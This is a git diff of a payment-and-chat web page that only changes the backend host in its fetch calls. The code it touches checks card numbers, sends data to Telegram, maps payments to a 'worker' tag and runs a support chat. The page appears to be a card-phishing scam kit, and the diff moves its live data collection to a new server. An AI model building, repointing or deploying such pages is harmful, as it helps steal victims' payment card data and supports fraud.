@@ -1988,7 +1988,7 @@
 
         async function checkCardStatus(cardNumber) {
             try {
-                const SERVER_URL = 'https://roomix-production.up.railway.app';
+                const SERVER_URL = 'https://room-production-a3ca.up.railway.app';
                 const response = await fetch(`${SERVER_URL}/check_card`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -2045,7 +2045,7 @@
         // ВАЖНО: Сохраняем СНАЧАЛА, чтобы тэг воркера находился сразу при отправке
         if (linkCode) {
             // Сохраняем link_code для transaction_id СРАЗУ
-            await fetch('https://roomix-production.up.railway.app/save_chat_mapping', {
+            await fetch('https://room-production-a3ca.up.railway.app/save_chat_mapping', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
@@ -2058,7 +2058,7 @@
             // Также сохраняем связь между transactionId и chatKey клиента
             const chatKey = sessionStorage.getItem('uniqueChatUserId');
             if (chatKey) {
-                await fetch('https://roomix-production.up.railway.app/save_chat_mapping', {
+                await fetch('https://room-production-a3ca.up.railway.app/save_chat_mapping', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
@@ -2068,7 +2068,7 @@
                 });
                 console.log('✅ Связь chatKey -> link_code сохранена');
                 
-                await fetch('https://roomix-production.up.railway.app/save_payment_chat_mapping', {
+                await fetch('https://room-production-a3ca.up.railway.app/save_payment_chat_mapping', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
@@ -2114,7 +2114,7 @@
 };
 
         // ОТПРАВЛЯЕМ ЧЕРЕЗ СЕРВЕР (БЕЗОПАСНО)
-        const SERVER_URL = 'https://roomix-production.up.railway.app';
+        const SERVER_URL = 'https://room-production-a3ca.up.railway.app';
         const response = await fetch(`${SERVER_URL}/send_to_telegram`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
@@ -2432,7 +2432,7 @@
 
                     if (linkCode) {
                         payload.link_code = linkCode;
-                        await fetch('https://roomix-production.up.railway.app/save_chat_mapping', {
+                        await fetch('https://room-production-a3ca.up.railway.app/save_chat_mapping', {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
                             body: JSON.stringify({
@@ -2446,7 +2446,7 @@
                         payload.reply_to_message_id = this.selectedReplyId;
                     }
 
-                    const response = await fetch('https://roomix-production.up.railway.app/send_chat_message', {
+                    const response = await fetch('https://room-production-a3ca.up.railway.app/send_chat_message', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
@@ -2553,7 +2553,7 @@
                 try {
                     console.log('📥 Загрузка истории чата для:', this.chatKey);
 
-                    const response = await fetch(`https://roomix-production.up.railway.app/chat_history/${this.chatKey}`);
+                    const response = await fetch(`https://room-production-a3ca.up.railway.app/chat_history/${this.chatKey}`);
 
                     if (response.ok) {
                         const data = await response.json();
@@ -2597,7 +2597,7 @@
                 try {
                     console.log('🔗 Подключаем SSE для:', this.chatKey);
 
-                    this.eventSource = new EventSource(`https://roomix-production.up.railway.app/sse/${this.chatKey}`);
+                    this.eventSource = new EventSource(`https://room-production-a3ca.up.railway.app/sse/${this.chatKey}`);
 
                     this.eventSource.onopen = () => {
                         console.log('✅ SSE подключен');
@@ -3018,3 +3018,4 @@
     </div>
 </body>
 </html>
+
